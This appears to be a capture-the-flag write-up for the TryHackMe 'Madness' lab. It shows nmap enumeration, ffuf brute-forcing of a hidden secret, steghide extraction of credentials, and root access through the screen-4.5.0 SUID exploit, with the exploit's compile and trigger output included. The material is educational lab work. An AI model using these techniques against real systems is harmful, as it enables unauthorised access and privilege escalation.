## Madness
https://tryhackme.com/room/madness

## Enum
```
nmap -Pn -sC -sV -sS 10.10.195.81 -vv -T 4
```
```
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnNdHQKU4ZvpWn7Amdx7LPhuwUsHY8p1O8msRAEkaIGcDzlla2FxdlnCnS1h+A84lzn1oubZyb5vMrPM8T2IsxoSU2gcbbgfq/3giAL+hmuKm/nD43OKRflSHlcpIVgwQOVRdEfbQSOVpV5VBtJziA1Xu2dts2WWtawDS93CBtlfyeh+BuxZvBPX2k8XPWwykyR6cWbdGz1AAx6oxNRvNShJ99c9Vs7FW6bogwLAe9SWsFi2oB7ti6M/OH1qxgy7ZPQFhItvI4Vz2zZFGVEltL1fkwk2dat8yfFNWwm6+/cMTJqbVb7MPt3jc9QpmJmpgwyWuy4FTNgFt9GKNOJU6N
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGMMalsXVdAFj+Iu4tESrnvI/5V64b4toSG7PK2N/XPqOe3q3z5OaDTK6TWo0ezdamfDPem/UO9WesVBxmJXDkE=
|   256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3zGVeEQDBVK50Tz0eNWzBJny6ddQfBb3wmmG3QtMAQ
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![image](https://user-images.githubusercontent.com/6504854/185188229-e9d3dc81-d5d8-4d72-ba29-2e38b2fe43b0.png)
![image](https://user-images.githubusercontent.com/6504854/185188356-18b9322b-5e56-4f2c-bea4-bbd1218116a6.png)
![image](https://user-images.githubusercontent.com/6504854/185189018-13573596-e86d-4687-b5e1-42cba44008db.png)

🏴 I scanned and nothing found. I checked top page carefully it seems bloken jpeg file and browser reads as png ?

![image](https://user-images.githubusercontent.com/6504854/185190655-bc8831af-ad23-4b79-8677-90e36faec2ef.png)

https://www.oh-benri-tools.com/tools/programming/hex-editor

![image](https://user-images.githubusercontent.com/6504854/185191346-e7dd29da-caee-4172-90fb-c4a9931c0ffe.png)

🏴 I rewrite top 2byte, change extention and open.

```
curl http://tg.thm/t***_**_****** -L
```
```
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: </p>

<p>That is wrong! Get outta here!</p>

</div>
</body>
</html>
```
![image](https://user-images.githubusercontent.com/6504854/185192073-77da6983-ebc2-4d0a-a1ba-f3fc2ee88798.png)
![image](https://user-images.githubusercontent.com/6504854/185192166-1ff97e52-87d2-4cf0-ada5-2fed493959c8.png)
![image](https://user-images.githubusercontent.com/6504854/185192319-283264d0-658e-46cb-9965-0923df4ae0cc.png)

🏴 I add prameter /?secret=1 and sent.

```
ffuf -u http://tg.thm/****_**_******?secret=FUZZ -w number.txt -t 1 -r
```
```
1                       [Status: 200, Size: 407, Words: 45, Lines: 19, Duration: 425ms]
2                       [Status: 200, Size: 407, Words: 45, Lines: 19, Duration: 423ms]
3                       [Status: 200, Size: 407, Words: 45, Lines: 19, Duration: 506ms]

70                      [Status: 200, Size: 408, Words: 45, Lines: 19, Duration: 440ms]
71                      [Status: 200, Size: 408, Words: 45, Lines: 19, Duration: 423ms]
72                      [Status: 200, Size: 408, Words: 45, Lines: 19, Duration: 438ms]
73                      [Status: 200, Size: 445, Words: 53, Lines: 19, Duration: 447ms]

100                     [Status: 200, Size: 409, Words: 45, Lines: 19, Duration: 401ms]
```
🏴 No 73 is diffrent from othes.

```
curl tg.thm/****_**_******/?secret=73
```
```
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 73</p>

<p>Urgh, you got it right! But I won't tell you who I am! y***********</p>

</div>
</body>
</html>
```
🏴 Bingo!!

```
steghide --extract -sf thm.jpeg
```
```
Enter passphrase:
Corrupt JPEG data: 18 extraneous bytes before marker 0xdb
wrote extracted data to "hidden.txt".


cat hidden.txt
Fine you found the password!

Here's a username

w****
```
![image](https://user-images.githubusercontent.com/6504854/185194413-97f235b0-f821-4911-b4b1-914f96c9cc2c.png)

🏴 I connected SSH with user w*****, pass y*********** but I couldn't. 

I connected SSH with user j****, pass y*********** but I couldn't.

"Fine you found the password!"?????? 🤸🤸🤸

![image](https://user-images.githubusercontent.com/6504854/185195938-1dd9769b-25c1-437e-bc21-7286466340c2.png)

```
wget https://i.imgur.com/5iW7kC8.jpg
```
```
steghide --extract -sf 5iW7kC8.jpg
```
```
Enter passphrase:
wrote extracted data to "password.txt".
```
```
cat password.txt
I didn't think you'd find me! Congratulations!

Here take my password

**********P
```
🏴 Finally I got credential???

## Flag
```
ssh j****@tg.thm
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

j****@ubuntu:~$ cat user.txt
```
🏴 OK 😄

```
j****@ubuntu:~$ sudo -l
[sudo] password for j****:
Sorry, may not run sudo on ubuntu.
j****@ubuntu:~$ ls -la /usr/bin/pkexec
ls: cannot access '/usr/bin/pkexec': No such file or directory
j****@ubuntu:~$ which pkexec
```
😢😢😢 最近できない。

```
j****@ubuntu:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount

@ubuntu:~$ LFILE=file_to_write
@ubuntu:~$ screen -L $LFILE echo DATA
[screen is terminating]
```
🏴 https://www.exploit-db.com/exploits/41154

```
j****@ubuntu:~$ vi test.sh
j****@ubuntu:~$ chmod +x test.sh
j****@ubuntu:~$ ./test.sh

./test.sh: line 1: creenroot.sh: command not found
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-.

# id
uid=0(root) gid=0(root) groups=0(root),1000()
# cat /root/root.txt
```

Thank you for your reading. Happy Hacking 😄 🌏🌏🌏

